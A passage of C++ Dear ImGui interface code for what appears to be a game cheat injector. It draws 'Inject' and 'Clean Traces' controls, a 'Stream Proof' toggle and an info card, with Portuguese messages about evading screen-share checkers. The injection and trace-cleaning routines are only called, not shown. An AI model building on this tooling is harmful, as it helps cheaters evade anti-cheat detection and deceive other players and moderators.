        const float textMix = EaseSmooth(Clamp01((radius - textDist + 6.0f) / 12.0f));
        const int shade = (int)(255.0f + (12.0f - 255.0f) * textMix);
        draw->AddText(font, size, tp,
            IM_COL32(shade, shade, shade, (int)(255.0f * Clamp01(alpha))), txt);
        };

    draw->PushClipRect(tMin, tMax, true);
    if (busy) {
        char buf[64];
        wsprintfA(buf, "%s...", kInjectLabels[s_injectingMode]);
        drawFitted(buf, kSize, 0.0f, 1.0f);
    }
    else if (s_injectAnim < 1.0f) {
        drawFitted(kInjectLabels[s_injectPrev], parkedSize, -ap * H, 1.0f);
        drawFitted(kInjectLabels[s_injectMode], parkedSize, (1.0f - ap) * H, 1.0f);
    }
    else {
        drawFitted(kInjectLabels[s_injectMode], parkedSize, 0.0f, 1.0f);
    }
    draw->PopClipRect();

    const ImVec2 ic(mx.x - 15.5f, mn.y + H * 0.5f);
    const float rot = busy
        ? (s_injectElapsed / 1.8f) * 6.2831853f
        : ap * 3.14159265f;
    const float iconDist = sqrtf((ic.x - cc.x) * (ic.x - cc.x) +
        (ic.y - cc.y) * (ic.y - cc.y));
    const float iconMix = EaseSmooth(Clamp01((radius - iconDist + 4.0f) / 8.0f));
    const int iconShade = (int)(255.0f + (12.0f - 255.0f) * iconMix);
    DrawSwapIcon(draw, ic, 5.0f, IM_COL32(iconShade, iconShade, iconShade, 255), rot);
}

void DrawCleanControl(ImDrawList* draw, const ImVec2& mn, const ImVec2& mx,
    ImVec2& outMin, ImVec2& outMax) {
    const float kRound = 6.0f;
    const float kSize = 17.0f;
    const float kIconZone = 20.0f;
    const float kSwapTime = 0.26f;

    outMin = mn;
    outMax = mx;
    ImFont* font = g_fontText ? g_fontText : ImGui::GetFont();

    if (s_cleanActive) {
        s_cleanElapsed += AnimDeltaTime();
        const bool done = ::InterlockedCompareExchange(&g_cleanDone, 0, 0) == 1;
        if (done) {
            s_cleanPostDone += AnimDeltaTime();
            if (s_cleanPostDone >= kCleanPostDoneGrace) {
                s_cleanActive = false;
                s_cleanMenuOpen = false;
            }
        }
    }
    const bool busy = s_cleanActive;

    ImGui::SetCursorScreenPos(mn);
    ImGui::InvisibleButton("##clean_traces", ImVec2(mx.x - mn.x, mx.y - mn.y));
    const bool hovered = ImGui::IsItemHovered() && !s_dragging;
    const bool pressed = hovered && !busy && ImGui::IsMouseDown(ImGuiMouseButton_Left);
    const bool overIcon = ImGui::GetIO().MousePos.x >= (mx.x - kIconZone);

    if (ImGui::IsItemClicked() && !busy && !s_injectActive) {
        if (overIcon) {
            s_cleanPrev = s_cleanMode;
            s_cleanMode = 1 - s_cleanMode;
            s_cleanAnim = 0.0f;
        }
        else {
            s_cleaningMode = s_cleanMode;
            s_cleanActive = true;
            s_cleanElapsed = 0.0f;
            s_cleanPostDone = 0.0f;
            s_cleanMenuOpen = true;
            s_menuOpen = false;
            CleanTracesAsync();
        }
    }

    if (s_cleanAnim < 1.0f)
        s_cleanAnim = Clamp01(s_cleanAnim + AnimDeltaTime() / kSwapTime);
    const float ap = EaseSmooth(s_cleanAnim);

    const float sheenTarget = hovered ? 1.0f : 0.0f;
    const float sheenStep = AnimDeltaTime() * 8.0f;
    if (s_cleanSheen < sheenTarget)
        s_cleanSheen = fminf(sheenTarget, s_cleanSheen + sheenStep);
    else if (s_cleanSheen > sheenTarget)
        s_cleanSheen = fmaxf(sheenTarget, s_cleanSheen - sheenStep);

    if (s_cleanSheen > 0.001f) {
        for (int i = 3; i >= 1; --i) {
            const float g = (float)i * 1.5f;
            draw->AddRectFilled(ImVec2(mn.x - g, mn.y - g),
                ImVec2(mx.x + g, mx.y + g),
                IM_COL32(255, 255, 255,
                    (int)(22.0f * EaseSmooth(s_cleanSheen) / (float)i)),
                kRound + g);
        }
    }

    const ImU32 face = pressed ? IM_COL32(24, 25, 29, 255)
        : (hovered ? IM_COL32(19, 20, 24, 255) : IM_COL32(30, 30, 30, 255));
    draw->AddRectFilled(mn, mx, face, kRound);

    if (s_cleanSheen > 0.001f) {
        const float W = mx.x - mn.x;
        const float cycle = W + 150.0f;
        const float sheenX = mn.x - 75.0f +
            fmodf((float)ImGui::GetTime() * 105.0f + 80.0f, cycle);
        AddRoundedSheen(draw, ImVec2(mn.x + 1.0f, mn.y + 1.0f),
            ImVec2(mx.x - 1.0f, mx.y - 1.0f), kRound - 1.0f,
            sheenX, 62.0f, IM_COL32(255, 255, 255, 0),
            0.28f * EaseSmooth(s_cleanSheen));
    }

    draw->AddRect(mn, mx,
        IM_COL32(255, 255, 255,
            (int)(70.0f + 105.0f * EaseSmooth(s_cleanSheen))),
        kRound, 0, 1.0f);

    const float H = mx.y - mn.y;
    const ImVec2 tMin(mn.x + 10.0f, mn.y);
    const ImVec2 tMax(mx.x - kIconZone, mx.y);
    const float availW = tMax.x - tMin.x;
    const float parkedSize = fminf(FitTextSize(font, kCleanLabels[0], kSize, availW),
        FitTextSize(font, kCleanLabels[1], kSize, availW));

    auto drawLabel = [&](const char* txt, float maxSize, float dy) {
        const float size = FitTextSize(font, txt, maxSize, availW);
        const ImVec2 ts = font->CalcTextSizeA(size, FLT_MAX, 0.0f, txt);
        const ImVec2 tp(tMin.x, mn.y + (H - ts.y) * 0.5f + dy);
        draw->AddText(font, size, tp, IM_COL32(255, 255, 255, 255), txt);
        };

    draw->PushClipRect(tMin, tMax, true);
    if (busy) {
        char buf[64];
        wsprintfA(buf, "%s...", kCleanLabels[s_cleaningMode]);
        drawLabel(buf, kSize, 0.0f);
    }
    else if (s_cleanAnim < 1.0f) {
        drawLabel(kCleanLabels[s_cleanPrev], parkedSize, -ap * H);
        drawLabel(kCleanLabels[s_cleanMode], parkedSize, (1.0f - ap) * H);
    }
    else {
        drawLabel(kCleanLabels[s_cleanMode], parkedSize, 0.0f);
    }
    draw->PopClipRect();

    const ImVec2 ic(mx.x - 15.5f, mn.y + H * 0.5f);
    const float rot = busy
        ? (s_cleanElapsed / 1.8f) * 6.2831853f
        : ap * 3.14159265f;
    DrawSwapIcon(draw, ic, 5.0f, IM_COL32(255, 255, 255, 255), rot);
}

void DrawStreamProofCheckbox(ImDrawList* draw, const ImVec2& mn, const ImVec2& mx,
    ImVec2& outMin, ImVec2& outMax) {
    outMin = mn;
    outMax = mx;

    const float dt = AnimDeltaTime();
    ImFont* font = g_fontText ? g_fontText : ImGui::GetFont();

    ImGui::SetCursorScreenPos(mn);
    ImGui::InvisibleButton("##stream_proof", ImVec2(mx.x - mn.x, mx.y - mn.y));
    const bool hovered = ImGui::IsItemHovered() && !s_dragging;
    const bool held = hovered && ImGui::IsMouseDown(ImGuiMouseButton_Left);
    if (ImGui::IsItemClicked()) {
        s_streamProof = !s_streamProof;
        ApplyStreamProof();
    }

    const float hoverTarget = hovered ? 1.0f : 0.0f;
    const float checkTarget = s_streamProof ? 1.0f : 0.0f;
    const float hoverStep = dt * 8.0f;
    const float checkStep = dt * 6.5f;
    if (s_streamProofHover < hoverTarget)
        s_streamProofHover = fminf(hoverTarget, s_streamProofHover + hoverStep);
    else
        s_streamProofHover = fmaxf(hoverTarget, s_streamProofHover - hoverStep);
    if (s_streamProofAnim < checkTarget)
        s_streamProofAnim = fminf(checkTarget, s_streamProofAnim + checkStep);
    else
        s_streamProofAnim = fmaxf(checkTarget, s_streamProofAnim - checkStep);

    const float ht = EaseSmooth(s_streamProofHover);
    const float ct = EaseSmooth(s_streamProofAnim);
    const float at = fmaxf(ht, ct);

    const float boxSize = 16.0f + ct * 1.5f;
    const ImVec2 bc(mn.x + 12.0f, (mn.y + mx.y) * 0.5f);
    const ImVec2 b0(bc.x - boxSize * 0.5f, bc.y - boxSize * 0.5f);
    const ImVec2 b1(bc.x + boxSize * 0.5f, bc.y + boxSize * 0.5f);

    const float glow = fmaxf(ht * 0.65f, ct);
    if (glow > 0.001f)
        draw->AddRectFilled(ImVec2(b0.x - 3.0f * glow, b0.y - 3.0f * glow),
            ImVec2(b1.x + 3.0f * glow, b1.y + 3.0f * glow),
            IM_COL32(255, 255, 255, (int)(25.0f * glow)), 7.0f);

    const ImU32 boxBg = held ? IM_COL32(8, 9, 12, 255)
        : IM_COL32(12, 13, 16, 255);
    draw->AddRectFilled(b0, b1, boxBg, 4.0f);

    draw->AddRect(b0, b1,
        IM_COL32(220, 225, 235, (int)(110.0f + 145.0f * at)),
        4.0f, 0, 1.0f);

    if (ct > 0.001f) {
        const ImVec2 a(bc.x - 5.5f, bc.y - 0.2f);
        const ImVec2 b(bc.x - 1.3f, bc.y + 4.0f);
        const ImVec2 c(bc.x + 6.5f, bc.y - 5.0f);
        const ImU32 checkCol = IM_COL32(242, 244, 248, (int)(255.0f * ct));
        const float thick = 2.2f;
        const float capR = thick * 0.5f;
        const float kFirst = 0.38f;

        ImVec2 pts[3];
        int n = 0;
        pts[n++] = a;
        if (ct < kFirst) {
            const float f = EaseSmooth(ct / kFirst);
            pts[n++] = ImVec2(a.x + (b.x - a.x) * f, a.y + (b.y - a.y) * f);
        }
        else {
            pts[n++] = b;
            const float f = EaseSmooth((ct - kFirst) / (1.0f - kFirst));
            pts[n++] = ImVec2(b.x + (c.x - b.x) * f, b.y + (c.y - b.y) * f);
        }

        draw->AddPolyline(pts, n, checkCol, 0, thick);
        draw->AddCircleFilled(a, capR, checkCol);
        draw->AddCircleFilled(pts[n - 1], capR, checkCol);
    }

    const char* label = "Stream Proof";
    const float textSize = 13.0f;
    const ImVec2 ts = font->CalcTextSizeA(textSize, FLT_MAX, 0.0f, label);
    const ImVec2 tp(mn.x + 26.0f, mn.y + ((mx.y - mn.y) - ts.y) * 0.5f);
    draw->AddText(font, textSize, tp,
        IM_COL32(242, 244, 248, (int)(220.0f + 35.0f * at)), label);
}

void DrawLockKeyCheckbox(ImDrawList* draw, const ImVec2& mn, const ImVec2& mx,
    ImVec2& outMin, ImVec2& outMax) {
    outMin = mn;
    outMax = mx;

    const float dt = AnimDeltaTime();
    ImFont* font = g_fontText ? g_fontText : ImGui::GetFont();

    ImGui::SetCursorScreenPos(mn);
    ImGui::InvisibleButton("##lock_key", ImVec2(mx.x - mn.x, mx.y - mn.y));
    const bool hovered = ImGui::IsItemHovered() && !s_dragging;
    const bool held = hovered && ImGui::IsMouseDown(ImGuiMouseButton_Left);
    if (ImGui::IsItemClicked())
        s_lockKey = !s_lockKey;

    const float hoverTarget = hovered ? 1.0f : 0.0f;
    const float checkTarget = s_lockKey ? 1.0f : 0.0f;
    const float hoverStep = dt * 8.0f;
    const float checkStep = dt * 6.5f;
    if (s_lockKeyHover < hoverTarget)
        s_lockKeyHover = fminf(hoverTarget, s_lockKeyHover + hoverStep);
    else
        s_lockKeyHover = fmaxf(hoverTarget, s_lockKeyHover - hoverStep);
    if (s_lockKeyAnim < checkTarget)
        s_lockKeyAnim = fminf(checkTarget, s_lockKeyAnim + checkStep);
    else
        s_lockKeyAnim = fmaxf(checkTarget, s_lockKeyAnim - checkStep);

    const float ht = EaseSmooth(s_lockKeyHover);
    const float ct = EaseSmooth(s_lockKeyAnim);
    const float at = fmaxf(ht, ct);

    const float boxSize = 16.0f + ct * 1.5f;
    const ImVec2 bc(mn.x + 12.0f, (mn.y + mx.y) * 0.5f);
    const ImVec2 b0(bc.x - boxSize * 0.5f, bc.y - boxSize * 0.5f);
    const ImVec2 b1(bc.x + boxSize * 0.5f, bc.y + boxSize * 0.5f);

    const float glow = fmaxf(ht * 0.65f, ct);
    if (glow > 0.001f)
        draw->AddRectFilled(ImVec2(b0.x - 3.0f * glow, b0.y - 3.0f * glow),
            ImVec2(b1.x + 3.0f * glow, b1.y + 3.0f * glow),
            IM_COL32(255, 255, 255, (int)(25.0f * glow)), 7.0f);

    const ImU32 boxBg = held ? IM_COL32(8, 9, 12, 255)
        : IM_COL32(12, 13, 16, 255);
    draw->AddRectFilled(b0, b1, boxBg, 4.0f);

    draw->AddRect(b0, b1,
        IM_COL32(220, 225, 235, (int)(110.0f + 145.0f * at)),
        4.0f, 0, 1.0f);

    if (ct > 0.001f) {
        const ImVec2 a(bc.x - 5.5f, bc.y - 0.2f);
        const ImVec2 b(bc.x - 1.3f, bc.y + 4.0f);
        const ImVec2 c(bc.x + 6.5f, bc.y - 5.0f);
        const ImU32 checkCol = IM_COL32(242, 244, 248, (int)(255.0f * ct));
        const float thick = 2.2f;
        const float capR = thick * 0.5f;
        const float kFirst = 0.38f;

        ImVec2 pts[3];
        int n = 0;
        pts[n++] = a;
        if (ct < kFirst) {
            const float f = EaseSmooth(ct / kFirst);
            pts[n++] = ImVec2(a.x + (b.x - a.x) * f, a.y + (b.y - a.y) * f);
        }
        else {
            pts[n++] = b;
            const float f = EaseSmooth((ct - kFirst) / (1.0f - kFirst));
            pts[n++] = ImVec2(b.x + (c.x - b.x) * f, b.y + (c.y - b.y) * f);
        }

        draw->AddPolyline(pts, n, checkCol, 0, thick);
        draw->AddCircleFilled(a, capR, checkCol);
        draw->AddCircleFilled(pts[n - 1], capR, checkCol);
    }

    const char* label = "Lock Key (Del)";
    const float textSize = 13.0f;
    const ImVec2 ts = font->CalcTextSizeA(textSize, FLT_MAX, 0.0f, label);
    const ImVec2 tp(mn.x + 26.0f, mn.y + ((mx.y - mn.y) - ts.y) * 0.5f);
    draw->AddText(font, textSize, tp,
        IM_COL32(242, 244, 248, (int)(220.0f + 35.0f * at)), label);
}

void DrawInjectMenu(ImDrawList* draw, const ImVec2& p, const ImVec2& q) {
    if (!s_menuOpen) return;

    const bool wasCached = ::InterlockedCompareExchange(&g_installerWasCached, 0, 0) == 1;
    const bool hadRunning = ::InterlockedCompareExchange(&g_installerHadRunning, 0, 0) == 1;
    const bool slept = ::InterlockedCompareExchange(&g_installerSlept, 0, 0) == 1;
    const bool done = ::InterlockedCompareExchange(&g_installerDone, 0, 0) == 1;
    const bool failed = ::InterlockedCompareExchange(&g_installerFailed, 0, 0) == 1;

    const float fade = fminf(1.0f, s_injectElapsed * 8.0f);

    draw->AddRectFilled(p, q, IM_COL32(0, 0, 0, (int)(120.0f * fade)), kRounding);

    const float w = 236.0f, h = 96.0f;
    const ImVec2 c((p.x + q.x) * 0.5f, (p.y + q.y) * 0.5f);
    const ImVec2 mn(c.x - w * 0.5f, c.y - h * 0.5f);
    const ImVec2 mx(c.x + w * 0.5f, c.y + h * 0.5f);
    const float round = 12.0f;
    draw->AddRectFilled(mn, mx, IM_COL32(30, 30, 30, (int)(255.0f * fade)), round);
    draw->AddRect(mn, mx, IM_COL32(120, 120, 120, (int)(140.0f * fade)), round, 0, 1.0f);

    DrawSpinner(draw, ImVec2(c.x, mn.y + 34.0f), 13.0f, (float)ImGui::GetTime() * 5.2f,
        IM_COL32(255, 255, 255, (int)(240.0f * fade)));

    ImFont* font = g_fontText ? g_fontText : ImGui::GetFont();

    const char* txt = nullptr;
    if (failed)
        txt = "Inject Failed.";
    else if (slept)
        txt = "Entre No Jogo e Farme!";
    else if (hadRunning)
        txt = "Attaching to Background App...";
    else if (!wasCached && !done)
        txt = "Downloading Modules...";
    else
        txt = "Injecting...";

    const float size = 14.0f;
    const ImVec2 ts = font->CalcTextSizeA(size, FLT_MAX, 0.0f, txt);
    draw->AddText(font, size, ImVec2(c.x - ts.x * 0.5f, mn.y + 60.0f),
        IM_COL32(255, 255, 255, (int)(245.0f * fade)), txt);
}

void DrawCleanMenu(ImDrawList* draw, const ImVec2& p, const ImVec2& q) {
    if (!s_cleanMenuOpen) return;

    const LONG stage = ::InterlockedCompareExchange(&g_cleanStage, 0, 0);
    const bool found = ::InterlockedCompareExchange(&g_cleanFound, 0, 0) == 1;
    const bool done = ::InterlockedCompareExchange(&g_cleanDone, 0, 0) == 1;
    const bool failed = ::InterlockedCompareExchange(&g_cleanFailed, 0, 0) == 1;

    const float fade = fminf(1.0f, s_cleanElapsed * 8.0f);

    draw->AddRectFilled(p, q, IM_COL32(0, 0, 0, (int)(120.0f * fade)), kRounding);

    const float w = 236.0f, h = 96.0f;
    const ImVec2 c((p.x + q.x) * 0.5f, (p.y + q.y) * 0.5f);
    const ImVec2 mn(c.x - w * 0.5f, c.y - h * 0.5f);
    const ImVec2 mx(c.x + w * 0.5f, c.y + h * 0.5f);
    const float round = 12.0f;
    draw->AddRectFilled(mn, mx, IM_COL32(30, 30, 30, (int)(255.0f * fade)), round);
    draw->AddRect(mn, mx, IM_COL32(120, 120, 120, (int)(140.0f * fade)), round, 0, 1.0f);

    DrawSpinner(draw, ImVec2(c.x, mn.y + 34.0f), 13.0f, (float)ImGui::GetTime() * 5.2f,
        IM_COL32(255, 255, 255, (int)(240.0f * fade)));

    ImFont* font = g_fontText ? g_fontText : ImGui::GetFont();

    const char* txt = nullptr;
    if (failed)
        txt = "Clean Failed.";
    else if (done && found)
        txt = "Real Installed.";
    else if (done && !found)
        txt = "No Traces Found.";
    else if (stage >= 1)
        txt = "Replacing With Real...";
    else
        txt = "Cleaning...";

    const float size = 14.0f;
    const ImVec2 ts = font->CalcTextSizeA(size, FLT_MAX, 0.0f, txt);
    draw->AddText(font, size, ImVec2(c.x - ts.x * 0.5f, mn.y + 52.0f),
        IM_COL32(255, 255, 255, (int)(245.0f * fade)), txt);

    if (!done && !failed) {
        const int secs = (int)s_cleanElapsed;
        char elapsed[64];
        wsprintfA(elapsed, "Elapsed Time: %d seg", secs);
        const float esize = 11.0f;
        const ImVec2 es = font->CalcTextSizeA(esize, FLT_MAX, 0.0f, elapsed);
        draw->AddText(font, esize,
            ImVec2(c.x - es.x * 0.5f, mn.y + 70.0f),
            IM_COL32(170, 180, 195, (int)(220.0f * fade)), elapsed);
    }
}

static char s_userName[256] = { 0 };
static char s_pcName[256] = { 0 };

void FetchSystemInfo() {
    DWORD n = sizeof(s_userName);
    if (!::GetUserNameA(s_userName, &n))
        wsprintfA(s_userName, "-");
    n = sizeof(s_pcName);
    if (!::GetComputerNameA(s_pcName, &n))
        wsprintfA(s_pcName, "-");
}

void DrawCardBase(ImDrawList* draw, const ImVec2& mn, const ImVec2& mx) {
    const float rounding = 14.0f;
    draw->AddRectFilled(mn, mx, IM_COL32(30, 30, 30, 255), rounding);
    draw->AddRect(mn, mx, IM_COL32(85, 85, 85, 80), rounding, 0, 1.0f);
}

void DrawInfoRow(ImDrawList* draw, ImFont* font, float x, float& y,
    const char* icon, const char* label, const char* value) {
    ImFont* iconFont = g_fontIcons ? g_fontIcons : ImGui::GetFont();
    const float iconSize = 16.0f;
    const float textX = x + iconSize + 10.0f;

    const float labelH = font->CalcTextSizeA(kLabelSize, FLT_MAX, 0.0f, label).y;
    const float valueH = font->CalcTextSizeA(kLabelSize, FLT_MAX, 0.0f, value).y;
    const float rowH = labelH + 2.0f + valueH;

    const ImVec2 its = iconFont->CalcTextSizeA(iconSize, FLT_MAX, 0.0f, icon);
    draw->AddText(iconFont, iconSize,
        ImVec2(x, y + (rowH - its.y) * 0.5f),
        IM_COL32(255, 255, 255, 200), icon);

    draw->AddText(font, kLabelSize, ImVec2(textX, y), IM_COL32(255, 255, 255, 110), label);
    draw->AddText(font, kLabelSize, ImVec2(textX, y + labelH + 2.0f),
        IM_COL32(255, 255, 255, 240), value);

    y += rowH + 12.0f;
}

static void MaskTopCorners(ImDrawList* draw, const ImVec2& mn, const ImVec2& mx,
    float rounding, ImU32 bg) {
    const float R = rounding + 1.0f;
    for (int i = 0; i <= (int)rounding; ++i) {
        const float dy = R - ((float)i + 0.5f);
        const float dx = sqrtf(fmaxf(0.0f, R * R - dy * dy));
        const float w = R - dx;
        if (w <= 0.05f) continue;
        const float y0 = mn.y + (float)i;
        draw->AddRectFilled(ImVec2(mn.x, y0), ImVec2(mn.x + w, y0 + 1.0f), bg);
        draw->AddRectFilled(ImVec2(mx.x - w, y0), ImVec2(mx.x, y0 + 1.0f), bg);
    }
}

float DrawAnimatedHeader(ImDrawList* draw, ImFont* textFont,
    const ImVec2& mn, const ImVec2& mx, const char* label) {
    const float rounding = 14.0f;
    const float headerH = 34.0f;
    const ImVec2 hmax(mx.x, mn.y + headerH);
    const float t = (float)ImGui::GetTime();

    draw->AddRectFilled(mn, hmax, IM_COL32(12, 13, 16, 255), rounding);
    draw->AddRectFilled(ImVec2(mn.x, hmax.y - rounding), hmax,
        IM_COL32(12, 13, 16, 255));

    draw->PushClipRect(mn, hmax, true);

    draw->AddRectFilledMultiColor(mn, hmax,
        IM_COL32(255, 255, 255, 9), IM_COL32(255, 255, 255, 2),
        IM_COL32(255, 255, 255, 1), IM_COL32(255, 255, 255, 6));

    const float W = mx.x - mn.x;
    const float cycle = W + 150.0f;
    const float sheenX = mn.x - 75.0f + fmodf(t * 27.0f + mn.x * 0.17f, cycle);
    draw->AddRectFilledMultiColor(
        ImVec2(sheenX - 55.0f, mn.y), ImVec2(sheenX, hmax.y),
        IM_COL32(255, 255, 255, 0), IM_COL32(255, 255, 255, 18),
        IM_COL32(255, 255, 255, 18), IM_COL32(255, 255, 255, 0));
    draw->AddRectFilledMultiColor(
        ImVec2(sheenX, mn.y), ImVec2(sheenX + 55.0f, hmax.y),
        IM_COL32(255, 255, 255, 18), IM_COL32(255, 255, 255, 0),
        IM_COL32(255, 255, 255, 0), IM_COL32(255, 255, 255, 18));

    const ImVec2 markMin(mn.x + 14.0f, mn.y + 10.0f);
    const ImVec2 markMax(markMin.x + 3.0f, mn.y + 24.0f);
    draw->AddRectFilled(ImVec2(markMin.x - 2.0f, markMin.y - 2.0f),
        ImVec2(markMax.x + 2.0f, markMax.y + 2.0f),
        IM_COL32(255, 255, 255, 18), 4.0f);
    draw->AddRectFilled(markMin, markMax, IM_COL32(235, 238, 245, 235), 2.0f);

    const float textSize = 13.0f;
    const ImVec2 ts = textFont->CalcTextSizeA(textSize, FLT_MAX, 0.0f, label);
    const ImVec2 tp(mn.x + 25.0f, mn.y + (headerH - ts.y) * 0.5f);
    draw->AddText(textFont, textSize, ImVec2(tp.x, tp.y + 1.0f),
        IM_COL32(0, 0, 0, 180), label);
    draw->AddText(textFont, textSize, tp, IM_COL32(242, 244, 248, 245), label);

    const float dotsX = mx.x - 17.0f;
    for (int i = 0; i < 3; ++i)
        draw->AddCircleFilled(ImVec2(dotsX - i * 5.0f, mn.y + headerH * 0.5f),
            1.0f, IM_COL32(255, 255, 255, 55 + i * 18), 8);

    draw->PopClipRect();

    MaskTopCorners(draw, mn, mx, rounding, IM_COL32(0, 0, 0, 255));

    const float divY = hmax.y;
    draw->AddLine(ImVec2(mn.x + 1.0f, divY + 1.0f),
        ImVec2(mx.x - 1.0f, divY + 1.0f), IM_COL32(0, 0, 0, 110), 1.0f);
    draw->AddLine(ImVec2(mn.x + 1.0f, divY),
        ImVec2(mx.x - 1.0f, divY), IM_COL32(150, 160, 178, 48), 1.0f);
    return divY;
}

void DrawInfosCard(ImDrawList* draw, const ImVec2& mn, const ImVec2& mx) {
    const float padX = 16.0f;
    const float rounding = 14.0f;
    ImFont* textFont = g_fontText ? g_fontText : ImGui::GetFont();

    draw->AddRectFilled(mn, mx, IM_COL32(30, 30, 30, 255), rounding);

    float y = DrawAnimatedHeader(draw, textFont, mn, mx, "INFOS") + 12.0f;

    DrawInfoRow(draw, textFont, mn.x + padX, y, ICON_FA_USER, "Usuario", s_userName);
    DrawInfoRow(draw, textFont, mn.x + padX, y, ICON_FA_DESKTOP, "Nome do PC", s_pcName);
    DrawInfoRow(draw, textFont, mn.x + padX, y, ICON_FA_INFINITY, "Plan Type", "Life Time");

    SYSTEMTIME st = {};
    ::GetLocalTime(&st);
    char dtBuf[64];
    wsprintfA(dtBuf, "%02d/%02d/%04d %02d:%02d",
        st.wDay, st.wMonth, st.wYear, st.wHour, st.wMinute);
    DrawInfoRow(draw, textFont, mn.x + padX, y, ICON_FA_CLOCK, "Data e hora", dtBuf);

    {
        const char* msg = "Farme Nos Teladores Meia Boca!";
        const float msgSize = 10.0f;
        ImFont* iconFont = g_fontIcons ? g_fontIcons : ImGui::GetFont();
        const float iconSize = 11.0f;
        const float gap = 6.0f;
        const ImVec2 its = iconFont->CalcTextSizeA(iconSize, FLT_MAX, 0.0f, ICON_FA_CIRCLE_INFO);
        const ImVec2 ms = textFont->CalcTextSizeA(msgSize, FLT_MAX, 0.0f, msg);
        const float totalW = its.x + gap + ms.x;
        const float cx = mn.x + ((mx.x - mn.x) - totalW) * 0.5f;
        const float ly = y + 16.0f;
        draw->AddText(iconFont, iconSize,
            ImVec2(cx, ly + (ms.y - its.y) * 0.5f),
            IM_COL32(255, 255, 255, 200), ICON_FA_CIRCLE_INFO);
        draw->AddText(textFont, msgSize, ImVec2(cx + its.x + gap, ly),
            IM_COL32(255, 255, 255, 200), msg);
    }

    draw->AddRect(mn, mx, IM_COL32(85, 85, 85, 80), rounding, 0, 1.0f);
}

static void DrawYinYang(ImDrawList* draw, const ImVec2& c, float r) {
    const ImU32 light = IM_COL32(242, 244, 248, 255);
    const ImU32 dark = IM_COL32(12, 13, 16, 255);
    const float pi = 3.1415926535f;

    draw->AddCircleFilled(c, r + 3.0f, IM_COL32(255, 255, 255, 13), 48);

    draw->AddCircleFilled(c, r, light, 48);
    draw->PathClear();
    draw->PathLineTo(c);
    draw->PathArcTo(c, r, -pi * 0.5f, pi * 0.5f, 28);
    draw->PathFillConvex(dark);

    const float halfR = r * 0.5f;
    const ImVec2 upper(c.x, c.y - halfR);
    const ImVec2 lower(c.x, c.y + halfR);
    draw->AddCircleFilled(upper, halfR, dark, 32);
    draw->AddCircleFilled(lower, halfR, light, 32);

    draw->AddCircleFilled(upper, r * 0.115f, light, 20);
    draw->AddCircleFilled(lower, r * 0.115f, dark, 20);

    draw->AddCircle(c, r, IM_COL32(255, 255, 255, 145), 48, 1.0f);
}

static void DrawCollapsedUI(HWND hWnd) {
    ImGui::SetNextWindowPos(ImVec2(0.0f, 0.0f));
    ImGui::SetNextWindowSize(ImVec2(kCollapsedSize, kCollapsedSize));

    ImGui::Begin("##overlay_collapsed", nullptr,
        ImGuiWindowFlags_NoTitleBar |
        ImGuiWindowFlags_NoResize |
        ImGuiWindowFlags_NoMove |
        ImGuiWindowFlags_NoScrollbar |
        ImGuiWindowFlags_NoScrollWithMouse |
        ImGuiWindowFlags_NoCollapse |
        ImGuiWindowFlags_NoDecoration |
        ImGuiWindowFlags_NoBackground |
        ImGuiWindowFlags_NoSavedSettings);

    ImDrawList* draw = ImGui::GetWindowDrawList();
    const ImVec2 p = ImGui::GetCursorScreenPos();
    const ImVec2 size(kCollapsedSize, kCollapsedSize);
    const ImVec2 center(p.x + kCollapsedSize * 0.5f, p.y + kCollapsedSize * 0.5f);

    ImGui::SetCursorScreenPos(p);
    ImGui::InvisibleButton("##restore_overlay_menu", size);
    const bool hovered = ImGui::IsItemHovered();

    if (hovered && ImGui::IsMouseClicked(ImGuiMouseButton_Left)) {
        ::GetCursorPos(&s_collapsedCursorStart);
        ::GetWindowRect(hWnd, &s_collapsedWindowStart);
        s_collapsedDragging = true;
        s_collapsedMoved = false;
    }

    if (s_collapsedDragging && ImGui::IsMouseDown(ImGuiMouseButton_Left)) {
        POINT cur = {};
        ::GetCursorPos(&cur);
        const int dx = cur.x - s_collapsedCursorStart.x;
        const int dy = cur.y - s_collapsedCursorStart.y;
        const int adx = dx < 0 ? -dx : dx;
        const int ady = dy < 0 ? -dy : dy;

        if (adx > 3 || ady > 3)
            s_collapsedMoved = true;

        if (s_collapsedMoved) {
            ::SetWindowPos(hWnd, nullptr,
                s_collapsedWindowStart.left + dx,
                s_collapsedWindowStart.top + dy,
                0, 0, SWP_NOSIZE | SWP_NOZORDER | SWP_NOACTIVATE);
        }
    }

    if (s_collapsedDragging && ImGui::IsMouseReleased(ImGuiMouseButton_Left)) {
        if (!s_collapsedMoved)
            SetOverlayCollapsed(hWnd, false);
        s_collapsedDragging = false;
        s_collapsedMoved = false;
    }

    const float t = hovered ? 1.0f : 0.0f;
    if (t > 0.0f) {
        DrawYinYang(draw, center, 18.0f);
        draw->AddCircle(center, 19.5f, IM_COL32(255, 255, 255, 60), 64, 1.0f);
    }
    else {
        DrawYinYang(draw, center, 17.0f);
    }

    ImGui::SetMouseCursor(ImGuiMouseCursor_Arrow);

    ImGui::End();
}

static DWORD PackIconPixel(float r, float g, float b, float a) {
    a = Clamp01(a);
    const int ia = (int)(a * 255.0f + 0.5f);
    const int ir = (int)(Clamp01(r) * a * 255.0f + 0.5f);
    const int ig = (int)(Clamp01(g) * a * 255.0f + 0.5f);
    const int ib = (int)(Clamp01(b) * a * 255.0f + 0.5f);
    return ((DWORD)ia << 24) | ((DWORD)ir << 16) | ((DWORD)ig << 8) | (DWORD)ib;
}

static HICON CreateLogoIcon(int size) {
    if (size <= 0) size = 32;

    BITMAPINFO bi = {};
    bi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bi.bmiHeader.biWidth = size;
    bi.bmiHeader.biHeight = -size;
    bi.bmiHeader.biPlanes = 1;
    bi.bmiHeader.biBitCount = 32;
    bi.bmiHeader.biCompression = BI_RGB;

    void* bits = nullptr;
    HDC dc = ::GetDC(nullptr);
    HBITMAP color = ::CreateDIBSection(dc, &bi, DIB_RGB_COLORS, &bits, nullptr, 0);
    ::ReleaseDC(nullptr, dc);
    if (!color || !bits) return nullptr;

    DWORD* px = (DWORD*)bits;
    const int ss = 4;
    const float cx = (float)size * 0.5f;
    const float cy = (float)size * 0.5f;
    const float r = (float)size * 0.405f;
    const float ring = fmaxf(1.25f, (float)size * 0.030f);

    for (int y = 0; y < size; ++y) {
        for (int x = 0; x < size; ++x) {
            float rr = 0.0f, gg = 0.0f, bb = 0.0f, aa = 0.0f;

            for (int sy = 0; sy < ss; ++sy) {
                for (int sx = 0; sx < ss; ++sx) {
                    const float fx = (float)x + ((float)sx + 0.5f) / (float)ss;
                    const float fy = (float)y + ((float)sy + 0.5f) / (float)ss;
